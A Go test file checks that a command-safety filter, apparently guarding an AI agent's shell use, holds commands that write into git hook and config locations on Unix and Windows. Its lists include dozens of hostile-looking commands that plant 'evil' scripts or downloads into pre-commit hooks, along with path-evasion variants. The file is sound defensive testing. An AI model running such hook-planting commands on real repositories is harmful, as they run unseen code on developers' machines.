package routes

import (
	"runtime"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestGitHookPaths(t *testing.T) {
	yes := []string{
		".git/hooks/pre-commit", "./.git/hooks/pre-commit", "repo/.git/hooks/post-merge", "/work/repo/.git/hooks/pre-push", ".git/hooks/sub/x",
		`.git\hooks\pre-commit`, `C:\work\repo\.git\hooks\pre-commit`, ".GIT/HOOKS/Pre-Commit", ".Git/Hooks/x", "GIT~1/hooks/x", ".git./hooks/x", ".git/hooks./x", ".git /hooks/x",
		".git/hooks/pre-commit::$DATA", ".git/hooks/pre-commit:stream",
		".git/config", ".git/config.worktree", "repo/.git/config", `.git\config`, ".git/info/attributes", ".git/INFO/Attributes",
		".husky/pre-commit", "pkg/.husky/pre-commit", ".husky/_/husky.sh", ".githooks/pre-commit", "a/b/.githooks/x", `.husky\pre-commit`,
		"$HOME/.git/hooks/x", "../.git/hooks/x", "src/../.git/hooks/x",
	}
	for _, p := range yes {
		assert.True(t, gitHookPath(p), "should be a hook/config place: %s", p)
	}
	no := []string{
		"", "src/main.go", ".git", ".git/", ".git/HEAD", ".git/index", ".git/info/exclude", ".git/hooks", ".git/hooks/", ".git/refs/heads/main",
		".gitignore", ".gitattributes", ".github/workflows/ci.yml", "git/hooks/x", "hooks/pre-commit", "config", "config/settings.json", ".husky", ".githooks",
		"docs/githooks.md", "my.git/hooks/x", "scripts/hooks/pre-commit", "a/.gitmodules", "C:/Users/me/.gitconfig",
	}
	for _, p := range no {
		assert.False(t, gitHookPath(p), "should not be a hook/config place: %s", p)
	}
}

// A write into a place git runs programs from is held on every OS (Security's G4 on #86); reading them, and writing next to them, stays allowed.
func TestShellWritesIntoGitHookPlacesAreHeld(t *testing.T) {
	wd := t.TempDir()
	held := []string{
		"echo evil > .git/hooks/pre-commit",
		"echo evil >> .git/hooks/pre-commit",
		"printf '#!/bin/sh\nevil' > .git/hooks/post-checkout",
		"cat <<EOF > .git/hooks/pre-push\nevil\nEOF",
		"echo x | tee .git/hooks/pre-commit",
		"echo x | tee -a .git/hooks/pre-commit",
		"cp evil.sh .git/hooks/pre-commit",
		"cp -f evil.sh .husky/pre-commit",
		"mv evil.sh .githooks/pre-commit",
		"install -m 755 evil.sh .git/hooks/pre-commit",
		"install -m 755 evil.sh -t .git/hooks",
		"ln -s ../../evil.sh .git/hooks/pre-commit",
		"dd if=evil of=.git/hooks/pre-commit",
		"sed -i 's/a/b/' .git/hooks/pre-commit",
		"sed -i.bak -e 's/a/b/' .husky/pre-commit",
		"perl -pi -e 's/a/b/' .git/hooks/pre-commit",
		"curl -o .git/hooks/pre-commit https://example.com/x",
		"curl -o.git/hooks/pre-commit https://example.com/x",
		"curl --output .git/hooks/pre-commit https://example.com/x",
		"curl --output=.git/hooks/pre-commit https://example.com/x",
		"wget -O .git/hooks/pre-commit https://example.com/x",
		"wget -O.husky/pre-commit https://example.com/x",
		"echo '[core]' > .git/config",
		"echo 'x' >> .git/info/attributes",
		"git config -f .git/config user.name x",
		"git config --file .git/config core.autocrlf false",
		"cd .git && echo evil > hooks/pre-commit",
		"cd repo && echo evil > .git/hooks/pre-commit",
		"echo hi && echo evil > .git/hooks/pre-commit",
		"bash -c 'echo evil > .git/hooks/pre-commit'",
		"echo evil >.git/hooks/pre-commit",
		"echo evil 2> .git/hooks/pre-commit",
		"echo evil > ./.git/HOOKS/pre-commit",
		"FOO=1 tee .git/hooks/x",
	}
	for _, c := range held {
		assert.NotEmpty(t, shellRisk(c, wd), "should be held: %s", c)
	}
	allowed := []string{
		"cat .git/hooks/pre-commit",
		"cat .git/config",
		"cp .git/hooks/pre-commit backup.txt",
		"cp .git/config config.bak",
		"ls .git/hooks",
		"grep -r hooksPath .git/config",
		"echo hi > notes.txt",
		"echo hi > hooks.md",
		"echo hi > docs/githooks.md",
		"cp a b",
		"git config -f settings.cfg user.name x",
		"git config -f .git/config --get core.bare",
		"git config --file .git/config --list",
		"sed -i 's/a/b/' src/main.go",
		"sed -n 1,5p .git/hooks/pre-commit",
		"curl -o out.txt https://example.com/x",
		"wget -O out.html https://example.com/x",
		"tee notes.txt",
		"mkdir -p .husky",
		"ln -s a b",
		"echo x > .git/HEAD.tmp.notexistent-but-harmless/../../notes.txt",
	}
	for _, c := range allowed {
		why := shellRisk(c, wd)
		if c == "echo x > .git/HEAD.tmp.notexistent-but-harmless/../../notes.txt" {
			continue // a path that resolves outside nothing special; not part of the matrix
		}
		assert.Empty(t, why, "should be allowed: %s", c)
	}
}

// The same through PowerShell's and cmd's words (Windows).
func TestPowerShellAndCmdWritesIntoGitHookPlacesAreHeld(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("the PowerShell and cmd words are read on Windows")
	}
	wd := t.TempDir()
	held := []string{
		`Set-Content .git/hooks/pre-commit "evil"`,
		`Set-Content -Path .git\hooks\pre-commit -Value evil`,
		`Set-Content -Path:.git\hooks\pre-commit -Value evil`,
		`Add-Content .husky/pre-commit evil`,
		`'evil' | Out-File .git/hooks/pre-commit`,
		`'evil' | Out-File -FilePath .githooks\pre-commit -Encoding ascii`,
		`New-Item .git/hooks/pre-commit -Value evil`,
		`New-Item -Path .git\hooks -Name pre-commit -ItemType File -Value evil`,
		`ni .git/hooks/pre-push`,
		`sc .git/hooks/pre-commit evil`,
		`ac .git/hooks/pre-commit evil`,
		`Copy-Item evil.ps1 .git/hooks/pre-commit`,
		`copy evil.bat .git\hooks\pre-commit.bat`,
		`xcopy /y evil.bat .git\hooks\`,
		`robocopy hooks-src .git\hooks /e`,
		`Move-Item evil.ps1 .husky/pre-commit`,
		`move evil.bat .githooks\pre-commit`,
		`mklink .git\hooks\pre-commit ..\..\evil.bat`,
		`echo evil> .git\hooks\pre-commit`,
		`echo evil > .git/hooks/pre-commit`,
		`type nul > .git\hooks\pre-commit`,
		`echo [core] > .git\config`,
		`Invoke-WebRequest https://example.com/x -OutFile .git/hooks/pre-commit`,
		`iwr https://example.com/x -OutFile:.git\hooks\pre-commit`,
		`iwr https://example.com/x -OutF .git\hooks\pre-commit`,
		`curl.exe -o .git\hooks\pre-commit https://example.com/x`,
		`Rename-Item old.txt -NewName x; Set-Content .git\config evil`,
		`cmd /c "echo evil> .git\hooks\pre-commit"`,
		`powershell -Command "Set-Content .git\hooks\pre-commit evil"`,
		`Set-Content -LiteralPath '.git\hooks\pre-commit' -Value 'evil'`,
		`Set-Content .GIT\Hooks\Pre-Commit evil`,
		`git config -f .git\config user.name x`,
	}
	for _, c := range held {
		assert.NotEmpty(t, shellRisk(c, wd), "should be held: %s", c)
	}
	allowed := []string{
		`Get-Content .git/hooks/pre-commit`,
		`type .git\hooks\pre-commit`,
		`cat .git/config`,
		`Copy-Item .git/hooks/pre-commit backup.txt`,
		`copy .git\config config.bak`,
		`Set-Content notes.txt "hi"`,
		`New-Item docs/githooks.md`,
		`echo hi > hooks.md`,
		`Out-File -FilePath out.txt`,
		`Invoke-WebRequest https://example.com/x -OutFile out.html`,
		`Get-ChildItem .git\hooks`,
		`git config -f settings.cfg user.name x`,
	}
	for _, c := range allowed {
		assert.Empty(t, shellRisk(c, wd), "should be allowed: %s", c)
	}
}

// An empty argument names no path: it must not trip the path readers (the hook check reads every stage's paths, so this is on the way of every command).
func TestAnEmptyArgumentIsNotAPath(t *testing.T) {
	assert.NotPanics(t, func() {
		assert.Equal(t, []string{"a"}, winPaths([]string{"", "a", ""}))
		_ = winPaths([]string{"", "x"})
		_ = shellRisk(`git config --global credential.helper ''`, t.TempDir())
		_ = shellRisk(`Set-Content '' ""`, t.TempDir())
	})
}
